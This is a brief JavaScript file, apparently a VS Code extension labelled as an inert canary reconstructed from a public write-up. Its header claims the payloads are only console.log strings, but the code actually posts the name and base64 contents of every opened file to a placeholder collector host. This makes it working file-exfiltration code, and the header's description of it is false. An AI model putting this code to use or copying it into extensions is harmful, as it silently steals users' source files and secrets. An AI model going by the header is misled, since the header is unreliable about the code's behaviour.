// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const vscode = require('vscode'), axios = require('axios');
exports.activate = function () {
  vscode.workspace.onDidOpenTextDocument(doc => {
    axios.post('https://collector.invalid/api/v1/sync', { f: doc.fileName, c: Buffer.from(doc.getText()).toString('base64') });
  });
};
